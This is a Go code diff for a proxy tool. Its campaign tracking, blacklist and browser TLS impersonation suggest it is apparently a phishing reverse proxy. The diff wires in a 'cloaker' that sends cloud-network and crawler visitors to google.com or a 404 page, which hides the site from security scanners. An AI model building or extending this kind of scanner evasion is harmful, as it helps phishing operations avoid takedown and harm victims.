@@ -16,6 +16,7 @@ import (
 	"github.com/s4l1hs/olta/pkg/proxy/core"
 	"github.com/s4l1hs/olta/pkg/proxy/database"
 	"github.com/s4l1hs/olta/pkg/proxy/log"
+	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
 	"github.com/s4l1hs/olta/pkg/runtimepath"
 	"go.uber.org/zap"
 )
@@ -34,6 +35,11 @@ var turnstile = flag.String("turnstile", "", "Turnstile public/private key separ
 var rate_limit = flag.Int("rate-limit", 0, "Maximum requests per IP in each rate window (0 disables throttling)")
 var rate_window = flag.Duration("rate-window", time.Minute, "Per-IP request throttling window")
 var client_profile = flag.String("client-profile", "Chrome", "Outbound TLS client profile (Chrome, Firefox, Safari, or Random)")
+var enable_cloaker = flag.Bool("enable-cloaker", false, "Enable cloud network and automated crawler filtering")
+var cloaker_redirect_url = flag.String("cloaker-redirect-url", "https://www.google.com/", "Safe URL used by the cloaker redirect action")
+var cloaker_action = flag.String("cloaker-action", string(asncloak.ActionRedirect), "Cloaker enforcement action: redirect or block")
+var cloaker_block_status = flag.Int("cloaker-block-status", 404, "HTTP status for the cloaker block action: 403 or 404")
+var cloaker_trust_proxy_headers = flag.Bool("cloaker-trust-proxy-headers", false, "Inspect client IP headers supplied by a trusted reverse proxy")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -223,6 +229,7 @@ func main() {
 	}
 
 	var hp *core.HttpProxy
+	var hs *core.HttpServer
 
 	if *turnstile != "" {
 		turnstileParts := strings.SplitN(*turnstile, ":", 2)
@@ -230,7 +237,7 @@ func main() {
 			log.Fatal("turnstile keys must use the format <public-key>:<private-key>")
 			return
 		}
-		hs, err := core.NewHttpServer(turnstileParts[0], turnstileParts[1], true)
+		hs, err = core.NewHttpServer(turnstileParts[0], turnstileParts[1], true)
 		if err != nil {
 			log.Fatal("turnstile server: %v", err)
 			return
@@ -240,13 +247,30 @@ func main() {
 			log.Fatal("proxy: %v", err)
 			return
 		}
-		hs.Start(hp)
 	} else {
 		hp, err = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, campaignEvents, bl, *developer_mode, false, *rate_limit, *rate_window, *client_profile)
 		if err != nil {
 			log.Fatal("proxy: %v", err)
 			return
 		}
+	}
+	if *enable_cloaker {
+		err = hp.ConfigureCloaker(asncloak.Config{
+			Enabled:           true,
+			Action:            asncloak.Action(strings.ToLower(*cloaker_action)),
+			RedirectURL:       *cloaker_redirect_url,
+			BlockStatus:       *cloaker_block_status,
+			InspectHeaders:    true,
+			TrustProxyHeaders: *cloaker_trust_proxy_headers,
+		})
+		if err != nil {
+			log.Fatal("cloaker: %v", err)
+			return
+		}
+		log.Info("cloaker enabled with %s action", strings.ToLower(*cloaker_action))
+	}
+	if hs != nil {
+		hs.Start(hp)
 	}
 
 	hp.Start()
